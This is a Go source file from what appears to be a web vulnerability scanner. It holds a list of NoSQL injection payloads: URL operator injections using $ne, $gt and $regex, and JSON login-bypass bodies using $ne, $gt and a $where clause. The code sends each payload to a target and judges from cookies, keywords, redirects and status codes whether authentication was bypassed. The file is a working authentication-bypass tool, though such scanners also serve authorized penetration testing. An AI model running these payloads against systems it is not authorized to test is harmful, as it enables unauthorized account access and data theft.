package nosqli

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type NoSQLPayload struct {
	Name    string
	Payload string
	Method  string
	IsJSON  bool
}

var Payloads = []NoSQLPayload{
	// --- GET Operator Injection ---
	{"NoSQL Operator Injection ([$ne])", "?user[$ne]=1&pass[$ne]=1", "GET", false},
	{"NoSQL Operator Injection ([$gt])", "?user[$gt]=&pass[$gt]=", "GET", false},
	{"NoSQL Regex Injection", "?user[$regex]=^adm&pass[$ne]=1", "GET", false},

	// --- POST JSON Auth Bypass ---
	{"NoSQL JSON Auth Bypass ($ne)", `{"username": {"$ne": null}, "password": {"$ne": null}}`, "POST", true},
	{"NoSQL JSON Auth Bypass ($gt)", `{"username": {"$gt": ""}, "password": {"$gt": ""}}`, "POST", true},
	{"NoSQL JSON $where Injection", `{"$where": "1 == 1"}`, "POST", true},
}

var SuccessIndicators = []string{
	`"status":"success"`, `"authenticated":true`, `Welcome Admin`, `/dashboard`, `profile`, `"user":"admin"`,
}

// Scan tests for NoSQL Injection vulnerabilities
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	// 1. Skip Static Files (Anti-FP Rule)
	lowerURL := strings.ToLower(baseURL)
	if strings.HasSuffix(lowerURL, ".js") || strings.HasSuffix(lowerURL, ".css") || 
	   strings.HasSuffix(lowerURL, ".png") || strings.HasSuffix(lowerURL, ".jpg") || 
	   strings.HasSuffix(lowerURL, ".jpeg") || strings.HasSuffix(lowerURL, ".gif") || 
	   strings.HasSuffix(lowerURL, ".svg") || strings.HasSuffix(lowerURL, ".ico") ||
	   strings.HasSuffix(lowerURL, ".woff") || strings.HasSuffix(lowerURL, ".woff2") ||
	   strings.HasSuffix(lowerURL, ".ttf") || strings.HasSuffix(lowerURL, ".eot") {
		return
	}

	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// 0. Establish Baseline (Check for pre-existing indicators)
	respBase, errBase := client.Get(baseURL)
	var baseStr string
	baseCookies := []*http.Cookie{}
	if errBase == nil {
		bodyBase, _ := io.ReadAll(respBase.Body)
		baseStr = strings.ToLower(string(bodyBase))
		baseCookies = respBase.Cookies()
		respBase.Body.Close()
	}

	for _, p := range Payloads {
		target := baseURL
		var req *http.Request
		var err error

		if p.Method == "GET" {
			target += p.Payload
			req, err = http.NewRequest("GET", target, nil)
		} else if p.Method == "POST" && p.IsJSON {
			req, err = http.NewRequest("POST", target, bytes.NewBuffer([]byte(p.Payload)))
			req.Header.Set("Content-Type", "application/json")
		}

		if err != nil {
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)
		
		// --- STRICT VALIDATION LOGIC ---
		
		isVuln := false
		evidence := ""
		stateChange := false

		// 1. Check for Set-Cookie (Strong Indicator of Auth)
		// If baseline didn't set cookies, but injection did -> Likely Success
		if len(resp.Cookies()) > len(baseCookies) {
			isVuln = true
			stateChange = true
			evidence = "New Session Cookie issued"
		}

		// 2. Check for "Success" JSON/Body indicators
		// Must NOT be in baseline
		lowerBody := strings.ToLower(bodyStr)
		
		successKeywords := []string{"\"success\":true", "\"auth\":true", "\"token\":\"", "welcome admin", "dashboard"}
		
		for _, kw := range successKeywords {
			if strings.Contains(lowerBody, kw) && !strings.Contains(baseStr, kw) {
				// Reflection check: Payload shouldn't just be reflected in the body
				if !strings.Contains(lowerBody, strings.ToLower(p.Payload)) {
					isVuln = true
					stateChange = true
					evidence = fmt.Sprintf("Authentication success indicator found: '%s'", kw)
					break
				}
			}
		}

		// 3. Status Code Change Logic (Anti-FP)
		if resp.StatusCode == 301 || resp.StatusCode == 302 {
			loc, _ := resp.Location()
			if loc != nil {
				locStr := strings.ToLower(loc.String())
				if strings.Contains(locStr, "login") || strings.Contains(locStr, "signin") || strings.Contains(locStr, "auth") {
					// Redirect to login = NOT a bypass
					continue 
				}
				// If redirect to /dashboard or /admin -> Bypass
				if strings.Contains(locStr, "dashboard") || strings.Contains(locStr, "admin") || strings.Contains(locStr, "home") {
					isVuln = true
					stateChange = true
					evidence = fmt.Sprintf("Redirected to authenticated area: %s", loc.String())
				}
			}
		} else if resp.StatusCode == 200 && respBase.StatusCode == 401 {
			// 401 -> 200 is a strong bypass indicator
			// But verify content isn't just a generic error page
			if !strings.Contains(lowerBody, "error") && !strings.Contains(lowerBody, "denied") {
				isVuln = true
				stateChange = true
				evidence = "HTTP 401 Unauthorized -> HTTP 200 OK"
			}
		}

		if isVuln && stateChange {
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", p.Name, target)
			onFound(core.Finding{
				Type:     "NoSQL Injection",
				Target:   target,
				Detail:   fmt.Sprintf("%s detected. Evidence: %s. Payload: %s \n\nComparison:\n- Baseline request -> Authentication failed\n- Injected request -> Authentication granted (Evidence Observed)", p.Name, evidence, p.Payload),
				Severity: "High", // High (Auth Bypass)
			})
			return // Stop after confirmed bypass
		}
	}
}
